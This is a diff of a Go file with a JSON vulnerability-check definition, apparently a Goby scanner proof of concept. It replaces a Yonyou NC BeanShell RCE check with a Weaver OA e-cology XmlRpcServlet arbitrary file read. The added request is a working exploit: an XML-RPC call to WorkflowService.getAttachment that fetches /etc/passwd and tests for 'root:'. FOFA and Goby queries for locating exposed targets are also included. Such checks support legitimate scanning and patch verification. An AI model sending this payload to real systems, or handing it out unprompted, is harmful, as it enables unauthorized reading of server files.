@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Weaver OA XmlRpcServlet 文件读取漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"泛微协同商务系统（e-cology）\" || product=\"泛微协同商务系统（e-cology）\"",
+  "GobyQuery": "app=\"泛微协同商务系统（e-cology）\" || product=\"泛微协同商务系统（e-cology）\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/xml"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\n<methodName>WorkflowService.getAttachment</methodName>\n<params><param><value><string>/etc/passwd</string>\n</value></param></params></methodCall>"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Weaver OA XmlRpcServlet 文件读取漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Weaver OA XmlRpcServlet file read",
       "Product": "",
       "Description": "",
       "Recommendation": "",
